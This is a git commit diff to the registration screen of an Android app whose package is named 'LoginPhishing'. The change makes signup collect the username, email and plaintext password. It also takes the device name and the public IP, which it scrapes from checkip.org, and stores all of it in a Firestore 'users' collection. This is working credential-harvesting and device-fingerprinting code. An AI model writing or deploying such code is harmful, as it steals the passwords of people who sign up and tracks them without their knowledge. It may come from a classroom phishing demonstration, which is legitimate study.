6c85f5083126696a522b61232f47d8b759c94cf2
EricTam <erictam96@hotmail.com>
2020-01-30 17:57:49 +0800

    v1

--- app/src/main/java/com/example/CZ/LoginPhishing/RegistrationActivity.java
+++ app/src/main/java/com/example/CZ/LoginPhishing/RegistrationActivity.java
@@ -4,9 +4,12 @@ package com.example.CZ.LoginPhishing;
 
 import android.app.ProgressDialog;
 import android.content.Intent;
+import android.os.AsyncTask;
+import android.os.Build;
 import android.support.annotation.NonNull;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
+import android.util.Log;
 import android.view.View;
 import android.widget.AutoCompleteTextView;
 import android.widget.Button;
@@ -15,11 +18,23 @@ import android.widget.TextView;
 import android.widget.Toast;
 
 import com.google.android.gms.tasks.OnCompleteListener;
+import com.google.android.gms.tasks.OnFailureListener;
+import com.google.android.gms.tasks.OnSuccessListener;
 import com.google.android.gms.tasks.Task;
 import com.google.firebase.auth.AuthResult;
 import com.google.firebase.auth.FirebaseAuth;
+import com.google.firebase.auth.FirebaseAuthException;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
+import com.google.firebase.firestore.DocumentReference;
+import com.google.firebase.firestore.FirebaseFirestore;
+
+import org.jsoup.Jsoup;
+import org.jsoup.nodes.Document;
+
+import java.io.IOException;
+import java.util.HashMap;
+import java.util.Map;
 
 public class RegistrationActivity extends AppCompatActivity {
 
@@ -30,8 +45,9 @@ public class RegistrationActivity extends AppCompatActivity {
     private ProgressDialog progressDialog;
     private FirebaseAuth firebaseAuth;
     private FirebaseDatabase firebaseDatabase;
-
-
+    private FirebaseFirestore db = FirebaseFirestore.getInstance();
+    private Map<String, Object> user = new HashMap<>();
+    private String getIP;
 
 
 
@@ -40,7 +56,12 @@ public class RegistrationActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_registration);
 
-        initializeGUI();
+        try {
+
+            initializeGUI();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
 
         signup.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -50,8 +71,13 @@ public class RegistrationActivity extends AppCompatActivity {
                 final String inputPw = password.getText().toString().trim();
                 final String inputEmail = email.getText().toString().trim();
 
-                if(validateInput(inputName, inputPw, inputEmail))
-                         registerUser(inputName, inputPw, inputEmail);
+                if(validateInput(inputName, inputPw, inputEmail)) {
+                    try {
+                        registerUser(inputName, inputPw, inputEmail);
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    }
+                }
 
             }
         });
@@ -67,7 +93,7 @@ public class RegistrationActivity extends AppCompatActivity {
     }
 
 
-    private void initializeGUI(){
+    private void initializeGUI() throws IOException {
 
         logo = findViewById(R.id.ivRegLogo);
         joinus = findViewById(R.id.ivJoinUs);
@@ -76,21 +102,32 @@ public class RegistrationActivity extends AppCompatActivity {
         password = findViewById(R.id.atvPasswordReg);
         signin = findViewById(R.id.tvSignIn);
         signup = findViewById(R.id.btnSignUp);
+
+        new getPublicIP().execute();
         progressDialog = new ProgressDialog(this);
 
         firebaseAuth = FirebaseAuth.getInstance();
     }
 
-    private void registerUser(final String inputName, final String inputPw, String inputEmail) {
+    private void registerUser(final String inputName, final String inputPw, String inputEmail) throws IOException {
+
+        // Create a new user with a email, username and password
+        user.put("username", username.getText().toString());
+        user.put("email", email.getText().toString());
+        user.put("password", password.getText().toString());
+        user.put("deviceName",getDeviceName());
+        user.put("publicIP",getIP);
 
         progressDialog.setMessage("Verificating...");
         progressDialog.show();
+
 
 
             firebaseAuth.createUserWithEmailAndPassword(inputEmail,inputPw).addOnCompleteListener(new OnCompleteListener<AuthResult>() {
                 @Override
                 public void onComplete(@NonNull Task<AuthResult> task) {
                     if(task.isSuccessful()){
+                        uploadDB();
                         progressDialog.dismiss();
                         sendUserData(inputName, inputPw);
                         Toast.makeText(RegistrationActivity.this,"You've been registered successfully.",Toast.LENGTH_SHORT).show();
@@ -98,7 +135,9 @@ public class RegistrationActivity extends AppCompatActivity {
                     }
                     else{
                         progressDialog.dismiss();
-                        Toast.makeText(RegistrationActivity.this,"Email already exists.",Toast.LENGTH_SHORT).show();
+                        Toast.makeText(RegistrationActivity.this,((FirebaseAuthException) task.getException()).getErrorCode(),Toast.LENGTH_LONG).show();
+                        Log.e("Signup Error", "onCancelled", task.getException());
+                        //Toast.makeText(RegistrationActivity.this,"Email already exists.",Toast.LENGTH_SHORT).show();
                     }
                 }
             });
@@ -132,6 +171,73 @@ public class RegistrationActivity extends AppCompatActivity {
 
         return true;
     }
+    public String getDeviceName() {
+        String manufacturer = Build.MANUFACTURER;
+        String model = Build.MODEL;
+        if (model.startsWith(manufacturer)) {
+            return capitalize(model);
+        } else {
+            return capitalize(manufacturer) + " " + model;
+        }
+    }
+
+
+    private String capitalize(String s) {
+        if (s == null || s.length() == 0) {
+            return "";
+        }
+        char first = s.charAt(0);
+        if (Character.isUpperCase(first)) {
+            return s;
+        } else {
+            return Character.toUpperCase(first) + s.substring(1);
+        }
+    }
+
+    private void uploadDB(){
+        // Add a new document with a generated ID
+        db.collection("users")
+                .add(user)
+                .addOnSuccessListener(new OnSuccessListener<DocumentReference>() {
+                    @Override
+                    public void onSuccess(DocumentReference documentReference) {
+                        Log.d("Success in FireStore", "DocumentSnapshot added with ID: " + documentReference.getId());
+                    }
+                })
+                .addOnFailureListener(new OnFailureListener() {
+                    @Override
+                    public void onFailure(@NonNull Exception e) {
+                        Log.w("Error in FireStore", "Error adding document", e);
+                    }
+                });
+
+    }
+
+        private class getPublicIP extends AsyncTask<Void, Void, Void> {
+
+            @Override
+            protected void onPreExecute() {
+                super.onPreExecute();
+            }
+
+            @Override
+            protected Void doInBackground(Void... voids) {
+                Document doc = null;
+                try {
+                    doc = Jsoup.connect("http://www.checkip.org").get();
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+                getIP= doc.getElementById("yourip").select("h1").first().select("span").text();
+                return null;
+            }
+
+            @Override
+            protected void onPostExecute(Void aVoid) {
+                Log.e("PUBLIC IP",getIP);
+                super.onPostExecute(aVoid);
+            }
+        }
 
 
 }
